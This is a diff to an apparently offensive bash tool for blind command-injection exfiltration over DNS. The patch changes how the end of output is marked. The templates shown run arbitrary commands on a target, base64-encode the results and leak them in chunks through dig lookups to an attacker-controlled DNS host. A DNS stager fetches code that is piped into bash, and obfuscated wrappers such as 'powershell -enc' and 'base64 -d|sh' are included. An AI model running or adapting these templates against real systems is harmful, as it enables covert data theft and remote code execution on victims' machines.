@@ -10,7 +10,6 @@ timeout=10
 threads=10
 s_dns_trigger="dig +short"
 
-signature="---procrustis--"
 trap "setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)" EXIT
 
 ########FUNCTION DEFINITIONS#############
@@ -204,31 +203,31 @@ printf "Timeout: ${YELLOW}${timeout}${NC}\n"
 ##########sh definitions#######
 assign sh outer_cmd_template 'sh -c $@|base64${IFS}-d|sh . echo %CMD_B64%'
 
-assign sh inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
+assign sh inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign sh inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
+    assign sh inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 }
-#assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$(($(date +%N)/100000%5)) -eq 0 ]] && wait or sleep' ."
+#assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$(($(date +%N)/100000%5)) -eq 0 ]] && wait or sleep' ."
 
 ##########bash definitions#######
 assign bash stager_template 'while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(%S_DNS_TRIGGGER% $i.%UNIQUE_DNS_HOST%);c=$(printf %02x ${a[*]}|xxd -r -p);done|bash'
 
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
 
-assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
+assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
+    assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 }
-#assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$((RANDOM%10)) -eq 0 ]] && wait or sleep' ."
+#assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$((RANDOM%10)) -eq 0 ]] && wait or sleep' ."
 
 ###########powershell definitions########
 assign powershell outer_cmd_template "powershell -enc %CMD_B64%"
 
 #since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach for multi process/threading extraction
 #we cant really depend on it, for now serialized
-assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})+(echo \"\`n%SIGNATURE%\"))) -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
+assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})+(echo \"\`n%SIGNATURE%\"))) -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
+    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
 }
 
 #######end of definitions###########
@@ -255,7 +254,6 @@ inner_cmd=${inner_cmd//'%UNIQUE_DNS_HOST%'/$unique_dns_host}
 inner_cmd=${inner_cmd//'%NLABELS%'/$nlabels}
 inner_cmd=${inner_cmd//'%LABEL_SIZE%'/$label_size}
 inner_cmd=${inner_cmd//'%CHUNK_SIZE%'/$((nlabels*label_size))}
-inner_cmd=${inner_cmd//'%SIGNATURE%'/"${signature}"}
 inner_cmd=${inner_cmd//'%THREADS%'/"${threads}"}
 debug_print "inner_cmd=$inner_cmd"
 
@@ -306,8 +304,13 @@ while :;do
         chunk=$(printf %s "${all_data%.*}" | tr -d '.')
         debug_print "index=$index chunk=$chunk"
         
+        #[[ ${#chunk} -ne $((nlabels*label_size)) ]] && nchunks=$index
+        [[ $chunk == *-- ]] && {
+            nchunks=$index
+            chunk=${chunk%--}
+        }
+        
         all_chunks[$index]=$chunk
-        [[ ${#chunk} -ne $((nlabels*label_size)) ]] && nchunks=$index
         [[ ${#all_chunks[@]} -eq $nchunks ]] && break
         
         printf "\rReceived chunks: ${#all_chunks[@]}"
@@ -318,4 +321,4 @@ output=$((IFS=;echo "${all_chunks[*]}")|strict_translator -d|b64 -d)
 last_line=$(echo "$output"|tail -n1)
 echo "$output"|sed '$d' >> "$outfile"
 
-[[ $last_line != "$signature" ]] && printf "\n${RED}Missing the output signature: try increasing timeout${NC}"
+[[ -z $nchunks ]] && printf "\n${RED}Missing the output signature: try increasing timeout${NC}"
